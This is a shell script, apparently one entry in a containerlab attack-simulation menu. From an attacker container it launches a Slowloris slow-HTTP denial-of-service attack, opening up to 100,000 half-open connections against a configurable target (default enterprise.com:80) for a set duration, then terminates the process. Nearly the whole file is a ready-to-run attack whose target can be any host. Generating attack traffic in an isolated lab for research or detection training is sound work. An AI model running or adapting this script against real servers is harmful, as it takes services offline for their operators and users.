#!/bin/sh

set -e

# ./dos_slow_http_slowloris.sh <attacker-container>
# ./dos_slow_http_slowloris.sh clab-virtual-env-attacker enterprise.com 80 300

# If called with -n, return the menu name
if [ "$1" = "-n" ]; then
    echo "Slow HTTP DoS Attack | Slowloris"
    exit 0
fi

# Ensure the name of the container is specified
if [ -z "$1" ]; then
    echo "Usage: $0 <attacker-container> [target] [port] [duration_seconds]"
    exit 1
fi

ATTACKER_CONTAINER="$1"
TARGET="${2:-enterprise.com}"             # Default target URL
PORT="${3:-80}"                           # Default to port 80
TIMEOUT="${4:-120}"                        # Default to 120 seconds

# Keeps many half-open HTTP connections to exhaust the server's thread pool
echo "================================"
echo "Attack: Slow HTTP DoS Attack (Slowloris)"
echo "Target: $TARGET"
echo "Port: $PORT"
echo "Timeout: ${TIMEOUT}s"
echo "Attacker container: $ATTACKER_CONTAINER"
echo "================================"

# Slowloris python tool
#docker exec "$ATTACKER_CONTAINER" \
#    timeout "$TIMEOUT" slowloris "$TARGET" -p "$PORT" -s 100000 --sleeptime 10

docker exec "$ATTACKER_CONTAINER" sh -c "
  slowloris $TARGET -p $PORT -s 100000 --sleeptime 10 &
  SLOWLORIS_PID=\$!
  sleep $TIMEOUT

  kill \$SLOWLORIS_PID 2>/dev/null || true
  sleep 2

  kill -9 \$SLOWLORIS_PID 2>/dev/null || true

  wait \$SLOWLORIS_PID 2>/dev/null || true
"
